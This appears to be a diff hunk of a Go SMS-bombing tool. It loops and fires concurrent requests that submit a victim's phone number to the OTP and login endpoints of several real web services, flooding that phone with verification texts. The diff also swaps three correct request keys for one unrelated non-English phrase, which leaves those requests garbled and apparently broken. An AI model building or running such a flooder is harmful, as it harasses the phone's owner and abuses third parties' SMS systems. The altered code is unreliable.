@@ -100,13 +100,13 @@ func main() {
 
 	for i := 0; i < repeatCount; i++ {
 		go sms("https://3tex.io/api/1/users/validation/mobile", map[string]interface{}{
-			"receptorPhone": phone,
+			"چیا له چوی": phone,
 		}, ch)
 		go sms("https://deniizshop.com/api/v1/sessions/login_request", map[string]interface{}{
-			"mobile_phone": phone,
+			"چیا له چوی": phone,
 		}, ch)
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
+			"چیا له چوی": phone,
 		}, ch)
 		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
 			"cellphone": phone,
